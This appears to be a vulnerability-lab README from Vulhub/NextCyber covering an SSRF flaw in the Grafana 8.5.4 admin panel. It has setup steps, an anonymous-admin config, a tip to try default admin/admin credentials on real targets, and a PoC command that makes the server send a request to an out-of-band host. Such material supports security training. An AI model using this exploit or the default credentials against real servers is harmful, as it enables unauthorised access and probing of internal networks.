# Grafana Admin Panel SSRF

> [中文文档](README.md)

| Attribute | Details |
|-----------|---------|
| **Vulnerability ID** | Grafana Admin SSRF |
| **Affected Versions** | Grafana 8.5.4 |
| **Vulnerability Type** | Server-Side Request Forgery (SSRF) |
| **Severity** | 🔴 High |
| **Default Port** | 3000 |

## Vulnerability Description

Grafana is an open-source metrics analytics and visualization suite. Its admin panel contains a feature that allows attackers to send HTTP requests to arbitrary addresses and supports custom HTTP headers.

Reference links:

- [grafana-ssrf - GitHub](https://github.com/RandomRobbieBF/grafana-ssrf)

## Vulnerability Environment

Run the following command to start a Grafana 8.5.4 instance:

```
docker compose up -d
```

After the environment starts, access `http://your-ip:3000` to view the admin panel. This admin panel does not require login because the Vulhub environment has configured anonymous user permissions:

```ini
[auth.anonymous]
enabled = true
org_role = Admin
```

In real-world scenarios, if you do not have permission to access the admin interface, you can try using the default credentials `admin` and `admin`. Only users who can successfully log in to the admin panel can exploit this vulnerability.

## Vulnerability Reproduction

Use [this POC](https://github.com/RandomRobbieBF/grafana-ssrf) to reproduce the SSRF vulnerability:

```
python grafana-ssrf.py -H http://your-ip:3000 -u http://example.interact.sh/attack
```

![SSRF POC Execution](https://static.nextcyber.cn/attachments/images/course/task/a3f66f4f5ad84d0d9a1628011bb767c9.png)

As shown, our out-of-band platform successfully received the HTTP request:

![Out-of-Band Platform Received Request](https://static.nextcyber.cn/attachments/images/course/task/c573a4f3d95c497ab719f7b8b3da5b3e.png)


---

## Practice

Practice this vulnerability online at [NextCyber Academy](https://app.nextcyber.cn/courses/83).
